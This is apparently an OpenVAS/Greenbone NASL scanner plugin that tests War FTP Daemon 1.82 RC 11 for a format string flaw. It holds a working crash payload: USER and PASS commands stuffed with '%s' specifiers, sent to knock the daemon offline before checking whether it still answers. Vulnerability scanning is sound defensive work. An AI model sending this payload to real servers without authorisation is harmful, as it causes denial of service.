if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.802452" );
	script_version( "2020-08-24T08:40:10+0000" );
	script_bugtraq_id( 55338 );
	script_tag( name: "cvss_base", value: "9.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:C" );
	script_tag( name: "last_modification", value: "2020-08-24 08:40:10 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2012-09-04 10:51:01 +0530 (Tue, 04 Sep 2012)" );
	script_name( "War FTP Daemon 'USER' and 'PASS' Remote Format String Vulnerability" );
	script_category( ACT_DENIAL );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_family( "FTP" );
	script_dependencies( "ftpserver_detect_type_nd_version.sc" );
	script_require_ports( "Services/ftp", 21 );
	script_mandatory_keys( "ftp/war_ftpd/detected" );
	script_xref( name: "URL", value: "http://1337day.com/exploits/19291" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/20957/" );
	script_xref( name: "URL", value: "http://seclists.org/fulldisclosure/2012/Aug/383" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/116122/warftp-format.txt" );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to cause a denial of
  service." );
	script_tag( name: "affected", value: "War FTP Daemon 1.82 RC 11." );
	script_tag( name: "insight", value: "The flaw is due to a format string error when the username and
  password are received in a ftp request. This can be exploited to crash the
  application via a ftp request packet containing a specially crafted username
  and password fields." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability.
  Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is running War FTP and is prone to format string
  vulnerability." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("ftp_func.inc.sc");
require("misc_func.inc.sc");
require("port_service_func.inc.sc");
ftpPort = ftp_get_port( default: 21 );
banner = ftp_get_banner( port: ftpPort );
if(!banner || !ContainsString( banner, "WarFTPd" )){
	exit( 0 );
}
soc = open_sock_tcp( ftpPort );
if(!soc){
	exit( 0 );
}
banner = ftp_recv_line( socket: soc );
if(!banner || !ContainsString( banner, "WarFTPd" )){
	ftp_close( socket: soc );
	exit( 0 );
}
fsReq = "%s%s%s%s%s%s%s%s%s%s%s%s";
fsUser = NASLString( "USER ", fsReq, "\\r\\n" );
fsPass = NASLString( "PASS ", fsReq, "\\r\\n" );
send( socket: soc, data: fsUser );
send( socket: soc, data: fsPass );
ftp_close( socket: soc );
sleep( 2 );
soc1 = open_sock_tcp( ftpPort );
if(!soc1){
	security_message( port: ftpPort );
	exit( 0 );
}
resp = ftp_recv_line( socket: soc1, length: 100 );
ftp_close( socket: soc1 );
if(!resp || !ContainsString( resp, "WarFTPd" )){
	security_message( port: ftpPort );
	exit( 0 );
}

